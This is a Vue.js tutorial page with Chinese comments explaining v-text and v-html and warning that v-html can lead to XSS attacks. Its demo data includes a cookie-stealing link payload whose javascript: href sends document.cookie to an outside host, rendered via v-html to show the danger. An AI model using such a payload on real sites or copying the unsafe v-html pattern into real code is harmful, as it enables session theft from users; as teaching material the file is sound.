<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="../vue.js"></script>
    <title>Vue Set</title>
</head>

<body>
    <div id="root">
        <div>{{name}}</div>
        <div v-text="name"></div>

        ////////////
        <div>你好，{{name}}</div>
        <div v-text="name">你好，</div>
        <!-- v-text把绑定的值给替换到标题里边，并不会做拼接 -->
        <!-- v-text：
        1，作用：向其所在的节点中渲染文本内容
        2，与差值语法的区别：v-text会替换节点内容，{{ name }}不会 -->
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        
        Vue.config.productionTip = false
        // 向指令节点中渲染包含html结构的内容
        // 与差值语法的区别：
        // v-html会替换节点中所有的内容，{{ name }}不会替换
        // v-html可以识别html结构

        // 严重注意：
        // v-html有安全性问题
        // 在网站上动态渲染HTML是非常危险的，容易导致xss攻击
        // 一定要在可信的内容上使用v-html，永远不要再用户提交的内容上使用
        var vm = new Vue({
            el: '#root',
            data: {
                name: "尚硅谷",
                str: '<h1>你好，尚硅谷</h1>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?" + document.cookie>兄弟快来看</a>'
            },
        })
    </script>
</body>

</html>
